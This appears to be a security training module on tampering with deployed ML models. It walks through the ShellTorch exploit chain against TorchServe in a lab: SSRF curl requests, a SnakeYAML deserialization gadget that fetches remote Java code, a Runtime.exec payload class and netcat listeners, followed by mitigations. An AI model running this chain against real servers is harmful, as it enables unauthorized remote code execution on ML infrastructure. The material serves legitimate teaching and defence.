# Model Deployment Tampering

---

Model deployment tampering attacks can occur in various stages of the ML lifecycle, particularly when models are transferred, integrated, or hosted on untrusted infrastructure. Attackers may insert backdoors, alter decision boundaries, or subtly degrade performance, often in ways that evade standard validation or testing procedures. Because the model appears to function normally under most circumstances, tampering can often go unnoticed until it causes security breaches or leads to faulty decisions in real-world use. Adversaries may be able to tamper with the model by exploiting security vulnerabilities in the ML deployment infrastructure or other integrated components. Furthermore, model deployment tampering can lead to data manipulation or unauthorized access to sensitive data, depending on the model's capabilities.

---

## Model Deployment Tampering Attacks

In its most basic form, model deployment tampering attacks can exploit broken access control in the ML application to gain access to the model files or training data. If adversaries gain unauthorized access to model files, they can directly alter the model’s internal parameters, such as weights and biases. These alterations enable precise, fine-grained manipulation of how the model makes decisions. Adversaries could introduce subtle changes to the model, influencing its behavior, or even introduce significant changes, potentially causing unexpected, malicious, or harmful behavior. Think of an ML model integrated into a web application. If the web application exposes an endpoint that enables unauthorized actors to upload a new model version, adversaries can directly tamper with the deployed model.

On the other hand, unauthorized access to training data provides attackers with an`indirect model deployment tampering attack`vector. For instance, assume an ML application exposes an improperly secured FTP server providing access to training data. This misconfiguration enables adversaries to potentially obtain unauthorized access to training data, which they can use to modify or poison the data used to train the model. They can subtly influence the model’s decision-making process from the ground up. This attack is known as`data poisoning`, and it can result in models that underperform on specific inputs, introduce bias, or exhibit adversarial vulnerabilities. Poisoned training data can be crafted to introduce`backdoors`, where the model generally behaves correctly but fails in targeted, malicious ways under specific conditions. This type of attack is difficult to detect during evaluation, especially if the poison is well-camouflaged within a large dataset. For more details on this type of attack, check out the[AI Data Attacks](https://enterprise.hackthebox.com/academy-lab/67497/preview/modules/302)module.

The risk of both types of tampering is amplified in modern ML pipelines that rely on shared infrastructure, pre-trained models, and distributed teams. Without proper access controls, versioning, and audit mechanisms, malicious changes can slip into production unnoticed and undetected. Moreover, attacks on training data are often overlooked compared to attacks on the final model, even though both can lead to similar harmful outcomes.

---

## Compromising the Server Infrastructure

Real-world instances of model deployment tampering often result from security vulnerabilities in the server infrastructure. For instance, a chain of security vulnerabilities called[ShellTorch](https://www.oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server)results in unauthorized remote code execution in`TorchServe`, a software library for hosting ML models.

At a high level, the exploit chain consists of three different security issues:

1. Misconfigured Management API enabling`unauthorized remote access`: A quick start guide in the official TorchServe repository exposed the management API on all interfaces, even though the documentation claims it is only accessible locally. Since no authentication was required, this enabled unauthorized remote access to the management API.
1. A`Server-Side Request Forgery (SSRF)`vulnerability enables downloading remote files: The management API supports loading additional models by supplying a URL. There is no validation on the supplied URL, enabling adversaries to download manipulated model files from their servers ([CVE-2023-43654](https://nvd.nist.gov/vuln/detail/cve-2023-43654)).
1. Usage of an insecure library containing a public`deserialization vulnerability`leading to remote code execution:  The vulnerable TorchServer version uses a version of the Java library`SnakeYaml`that is vulnerable to a deserialization vulnerability ([CVE-2022-1471](https://nvd.nist.gov/vuln/detail/cve-2022-1471)). This vulnerability can be exploited by supplying a malicious YAML file to achieve remote code execution. For an overview of deserialization attacks, check out the[Introduction to Deserialization Attacks](https://academy.hackthebox.com/course/preview/introduction-to-deserialization-attacks)module.
Let us explore how to execute the exploit chain to compromise the ML deployment server, leading to remote code execution. We can connect to the lab's SSH service and forward the local port 8000 to the lab, allowing the lab to connect back to our system. Additionally, we will forward the lab's port 8081 to our system so we can access the management interface:

```
icantthinkofaname23@htb[/htb]`#Forwardlocalport8000to the lab#Forward lab port8081to127.0.0.1:8081$sshhtb-stdnt@<SERVER_IP> -p <PORT> -R 8000:127.0.0.1:8000 -L 8081:127.0.0.1:8081 -N`
```

#### Unauthorized Remote Access

First, let us ensure that we can indeed access the management API running on port 8081 and confirm that the lab is vulnerable to the first misconfiguration in the exploit chain:

```
icantthinkofaname23@htb[/htb]`$curlhttp://127.0.0.1:8081/{
  "code": 405,
  "type": "MethodNotAllowedException",
  "message": "Requested method is not allowed, please refer to API document."
}`
```

The API responds with an error message since we provided an invalid request. However, we successfully confirmed that we can access the management API.

#### Server-Side Request Forgery (SSRF)

We can confirm the SSRF vulnerability by starting a netcat listener on the port we forwarded to the lab via SSH:

```
icantthinkofaname23@htb[/htb]`$nc-lnvp8000`
```

The vulnerable endpoint is the`/workflows`endpoint, which accepts a remote URL in the`URL`GET parameter in HTTP POST requests. Keep in mind that we can specify the URL`127.0.0.1:8000`to connect to our host system due to the SSH port forwarding:

```
icantthinkofaname23@htb[/htb]`$curl-X POST http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/ssrf`
```

Executing the above curl command, we can confirm the SSRF vulnerability as we get a hit on the netcat listener:

```
icantthinkofaname23@htb[/htb]`$nc-lnvp8000listening on [any] 8000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 52932
GET /ssrf HTTP/1.1
User-Agent: Java/17.0.15
Host: 127.0.0.1:8000
Accept: text/html, image/gif, image/jpeg, */*; q=0.2
Connection: keep-alive`
```

To prepare the deserialization exploit, we must create a malicious`war`file that loads additional code from our system, which is subsequently executed during the deserialization process. To create such a malicious archive, we need to create two local files such that`TorchServe`accepts it. Firstly, we need to create a file`handler.py`:

Code:python```
`definitialize(self,context):self.model=self.load_model()`
```

Secondly, we must add a specification file`spec.yaml`that forces the vulnerable library to load additional Java code from our system. The file contains a commonly known gadget that loads additional code from our system by:

- Constructing a[java.net.URL](https://docs.oracle.com/javase/8/docs/api/java/net/URL.html)object pointing to the forwarded port`http://127.0.0.1:8000`.
- Constructing a[java.net.URLClassLoader](https://docs.oracle.com/javase/8/docs/api/java/net/URLClassLoader.html)object with the URL object to load an additional class from the specified URL.
- Constructing a[javax.script.ScriptEngineManager](https://docs.oracle.com/javase/8/docs/api/javax/script/ScriptEngineManager.html)object from the URLClassLoader object to execute the constructor in the provided class.
For more information on the gadget, check out[this](https://raw.githubusercontent.com/mbechler/marshalsec/refs/heads/master/marshalsec.pdf)paper.

Code:yaml```
`!!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL["http://127.0.0.1:8000/"]]]]`
```

Finally, we can create a`war`archive in the expected format with the Python library`torch-workflow-archiver`:

```
icantthinkofaname23@htb[/htb]`$pip3installtorch-workflow-archiver$torch-workflow-archiver --workflow-name pwn --spec-file spec.yaml --handler handler.py`
```

The above command creates a file`pwn.war`containing the malicious`spec.yaml`and`handler.py`files.

#### Deserialization

Before triggering the final step in the exploit chain, which will result in remote code execution, we need to create and host a Java payload on our system. After uploading the previous step's malicious`pwn.war`file, the vulnerable system will fetch and execute Java code hosted on our system. The Java payload must implement the`ScriptEngineFactory`interface to be successfully executed. As such, we can use the following baseline class`MyScriptEngineFactory.java`:

Code:java```
`packageexploit;importjavax.script.ScriptEngine;importjavax.script.ScriptEngineFactory;importjava.io.IOException;importjava.util.List;publicclassMyScriptEngineFactoryimplementsScriptEngineFactory{publicMyScriptEngineFactory(){try{Runtime.getRuntime().exec("curl http://127.0.0.1:8000/rce");}catch(IOExceptione){e.printStackTrace();}}@OverridepublicStringgetEngineName(){returnnull;}@OverridepublicStringgetEngineVersion(){returnnull;}@OverridepublicList<String>getExtensions(){returnnull;}@OverridepublicList<String>getMimeTypes(){returnnull;}@OverridepublicList<String>getNames(){returnnull;}@OverridepublicStringgetLanguageName(){returnnull;}@OverridepublicStringgetLanguageVersion(){returnnull;}@OverridepublicObjectgetParameter(Stringkey){returnnull;}@OverridepublicStringgetMethodCallSyntax(Stringobj,Stringm,String...args){returnnull;}@OverridepublicStringgetOutputStatement(StringtoDisplay){returnnull;}@OverridepublicStringgetProgram(String...statements){returnnull;}@OverridepublicScriptEnginegetScriptEngine(){returnnull;}}`
```

We can customize the payload in the constructor in any way we want. Remember that the lab can only connect back to our attacker system on the ports we forwarded via SSH. Therefore, to establish a reverse shell, we need to revisit the SSH command and forward an additional port. For now, we will trigger an additional GET request to our web server to demonstrate remote code execution.

After adjusting the payload, we can compile it:

**Note:**The attack may require a specific Java version to run. It was tested on Java version`openjdk 17.0.15`. To force using Java 17, use the`-source 17`and`-target 17`parameters.

```
icantthinkofaname23@htb[/htb]`$javac MyScriptEngineFactory.java`
```

Lastly, we must create a particular directory structure for the payload to be loaded and executed correctly. On one hand, we need to create a file`javax.script.ScriptEngineFactory`that points to our payload. On the other hand, we need to move our compiled payload`MyScriptEngineFactory.class`to the expected directory:

```
icantthinkofaname23@htb[/htb]`$mkdir-p META-INF/services/$echo'exploit.MyScriptEngineFactory'>META-INF/services/javax.script.ScriptEngineFactory$mkdirexploit$mvMyScriptEngineFactory.class exploit/`
```

For more details on the snakeyaml deserialization vulnerability and how to exploit it, check out[this](https://github.com/artsploit/yaml-payload)GitHub repository.

#### Obtaining Remote Code Execution (RCE)

After all this setup, we can finally trigger the exploit. First, we need to start a web server in the directory containing the`META-INF`and`exploit`directories as well as the`pwn.war`file:

```
icantthinkofaname23@htb[/htb]`$python3 -m http.server8000`
```

To trigger the deserialization and subsequent loading of Java code from our system, we need to exploit the SSRF vulnerability with a URL pointing to the malicious`war`archive:

```
icantthinkofaname23@htb[/htb]`$curl-X POST http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/pwn.war`
```

Going back to our web server access log, we can see the following requests:

```
icantthinkofaname23@htb[/htb]`$python3 -m http.server8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [22/Apr/2025 22:29:47] "GET /pwn.war HTTP/1.1" 200 -
127.0.0.1 - - [22/Apr/2025 22:29:47] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
127.0.0.1 - - [22/Apr/2025 22:29:47] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
127.0.0.1 - - [22/Apr/2025 22:29:47] "GET /exploit/MyScriptEngineFactory.class HTTP/1.1" 200 -
127.0.0.1 - - [22/Apr/2025 22:29:47] code 404, message File not found
127.0.0.1 - - [22/Apr/2025 22:29:47] "GET /rce HTTP/1.1" 404 -`
```

Firstly, the SSRF exploit caused the remote system to fetch the malicious`pwn.war`archive. Subsequently, our deserialization gadget coerced the system to fetch additional Java code from our system by accessing the`META-INF/services/javax.script.ScriptEngineFactory`file and finally fetching the payload from`exploit/MyScriptEngineFactory.class`. Lastly, our RCE payload caused an additional GET request to`/rce`.

This particular real-world exploit chain illustrates how multiple security issues within the ML application's deployment infrastructure can compromise the entire system, potentially endangering the entire ML pipeline and, most likely, putting the ML model and data at risk.

---

## Mitigations

Countermeasures against model deployment tampering must be implemented in the deployment environment and the entire software supply chain. It is vital to follow common supply chain best practices, such as verifying and avoiding untrusted sources, auditing third-party software for security vulnerabilities, complete documentation, and potentially using automated tools. Furthermore, third-party dependencies must be kept up to date, and their respective security best practices should be followed. Security updates need to be installed as soon as possible to mitigate potential vulnerabilities. This applies to all underlying software components, including container runtimes, orchestration systems such as Kubernetes, and model serving frameworks like TorchServe. Additional security measures, such as access control mechanisms or multi-factor authentication (MFA), should be implemented to restrict access if possible. Using`secure build pipelines`such as isolated, hardened CI/CD systems with minimal external dependencies helps prevent tampering during the build and deployment phases. Regular integrity checks, automated vulnerability scanning, and reproducible builds are crucial safeguards against supply chain attacks that target the source code or deployment tools.